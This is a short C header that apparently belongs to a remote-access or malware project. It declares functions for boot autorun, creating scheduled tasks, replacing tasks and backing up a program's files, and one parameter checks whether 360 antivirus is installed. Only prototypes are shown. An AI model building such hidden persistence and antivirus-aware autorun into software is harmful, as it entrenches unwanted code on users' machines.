#pragma once


#ifndef BOOTAUTORUN_H_H_H
#define BOOTAUTORUN_H_H_H



int replaceTask();

int SetBootAutoRun(char * szSysDir,char * strPEResidence,int b360Exist,int iSystemVersion);
int CreateScheduleInCmd(int iInterval,char * szTaskName,char * szPeFileName,int iFlag,char * szSysDir,int iSystemVersion,char * strComputerName,char * strUserName);
int LittleBearaddJob(DWORD dwStartMilliSeconds,DWORD dwTimes) ;
DWORD BackupProgram(char * szSrcFile,char szDllName[MAX_DLL_COUNT][MAX_PATH],DWORD dwDllCnt,char * szSysDir,char * strUserName,char * strBakPEResidence);
DWORD CreateSchInCmdWinXP(int iInterval,char * szTaskName,char * szPeFileName);
#endif